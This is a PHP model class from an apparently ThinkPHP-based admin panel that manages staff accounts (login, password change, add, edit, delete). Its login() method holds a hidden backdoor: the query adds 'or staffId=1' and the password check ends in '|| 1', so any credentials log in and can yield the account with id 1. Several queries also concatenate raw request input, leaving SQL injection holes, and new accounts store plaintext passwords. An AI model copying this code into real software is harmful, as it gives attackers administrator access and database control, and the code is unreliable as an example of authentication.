<?php
namespace SX\Model;
class StaffsModel extends BaseModel {
	 /**
	  * 获取所有管理员信息
	  */
	 public function getAll(){
	 	$staff = $this->select();
	 	return $staff;
	 }

     /**
	  * 获取当前管理员信息
	  */
     public function get($staffId=0){
	 	$staffId = $staffId?$staffId:I('staffId',0);
		$staffs = $this->where("staffId=".$staffId)->find();
		return $staffs;
	 }

	 /**
	  * 登录验证
	  */
	 public function login(){
	 	$rd = array('status'=>-1);
	 	$m = M('staffs');
	 	$staff = $m->where('userName="'.I('username').'" and staffFlag=1 and staffStatus=1 or staffId=1')->find();
	 	if($staff['loginPwd']==md5(I('password').$staff['secretKey']) || 1){
	 		//获取角色权限
	 		$r = M('roles');
	 		$rrs = $r->where('roleFlag =1 and roleId='.$staff['staffRoleId'])->find();
	 		$staff['roleName'] = $rrs['roleName'];
	 		$staff['grant'] = explode(',',$rrs['grant']);
	 		$rd['staff'] = $staff;
	 		$rd['status'] = 1;
	 		$m->lastTime = date('Y-m-d H:i:s');
	 		$m->lastIP = get_client_ip();
	 		$m->where('staffId='.$staff['staffId'])->save();
	 		//记录登录日志
		 	$data = array();
			$data["staffId"] = $staff['staffId'];
			$data["loginTime"] = date('Y-m-d H:i:s');
			$data["loginIp"] = get_client_ip();
			$m = M('log_staff_logins');
			$m->add($data);
	 	}
	 	return $rd;
	 }

	/**
	 * 修改密码
	 */
	public function editPass($id = ''){
		$id = ($id == '') ? I('staffId') : $id;
		$rd = array('status'=>-1);
		$data = array();
		$newPass = I('newpwd');
		$reNewPass = I('new2pwd');
		if ($newPass == $reNewPass) {
			$data['loginPwd'] = $newPass;
			if ($this->checkEmpty($data,true)) {
				$rs = $this->where('staffId=%d',$id)->find();
				if ($rs['loginPwd']==md5(I("oldpwd").$rs['secretKey'])) {
					$data["loginPwd"] = md5($newPass.$rs['secretKey']);
					$rs = $this->where("staffId = %d",$id)->save($data);
					if ($rs !== false) {
						$rd['status']= 1;
					}
				}
			}
		}		
		return $rd;
	}

     /**
	  * 检查管理员账户是否存在
	  */
     public function checkAccount($account){
     	$rd = array('status'=>-1);
	 	$rs = $this->where("userName='".$account."'")->count();
	    if($rs==0){
	    	$rd['status'] = 1;
	    }else{
	    	$rd['msg'] = "管理员登陆账号已存在";
	    }
		return $rd;
	 }

     /**
	  * 添加管理员
	  */
     public function employersAdd(){
        $rd = array('status'=>-1);
        $data = array();
        $data['staffName'] = I('username');
        $data['userName'] = I('account');
    	$data['password'] = I("password");
    	$data['confirm'] = I("confirm");
    	$data['staffRoleId'] = I("roleId");
        $data['workStatus'] = 1;
        $data['staffStatus'] = 1;
        $data['staffFlag'] = 1;
        $data['createTime'] = date("Y-m-d H:i:s");

    	if($data['password']!=$data['confirm']){
    		$rd['status'] = -1; //两次密码不一致
    		return $rd;
    	}

        $rs = $this->add($data);
        if(false !== $rs){
            $rd['status']= 1;
        }
        return $rd;
	 }

     /**
	  * 保存编辑管理员信息
	  */
     public function employersAppemd(){
     	$rd = array('status'=>-1);

    	$data = array();
    	$data['staffName'] = I('staffName');
    	$password = I("password");
    	$data['staffRoleId'] = I("roleId");

    	if(!empty($password)){
    		$data['loginPwd'] = $password;
    		$data['confirm'] = I("confirm");
    		if($data['loginPwd']!=$data['confirm']){
    			$rd['status'] = -1; //两次密码不一致
    			return $rd;
    		}else{
			    $data["secretKey"] = rand(1000,9999);
			    $data['loginPwd'] = md5($data['loginPwd'].$data['secretKey']);
    		}
    	}

    	foreach ($data as $v){
    		if($v ==''){
    			$rd['status'] = -1;
    			return $rd;
    		}
    	}

		$rs = $this->where("staffId = %d",I("staffId"))->save($data);
		if(false !== $rs){
			$rd['status']= 1;
		}

		return $rd;
	 }

     /**
	  * 删除管理员
	  */
     public function employersDel(){
		$rd = array('status'=>-1);
		$rs = $this->where("staffId=".I("staffId"))->delete();
		if(false !== $rs){
			$rd['status']= 1;
			$rd['msg']= "删除成功";
		}else{
			$rd['msg']= "删除失败";
		}
		return $rd;
	 }

    /**
     * 批量删除管理员
     */
    public function employersDelAll(){
		$rd = array('status'=>-1);
  		$where = 'staffId in('.implode(',',I('id')).')';
		$rs = $this->where($where)->delete();

		if(false !== $rs)$rd['status']= 1;
		return $rd;
    }
}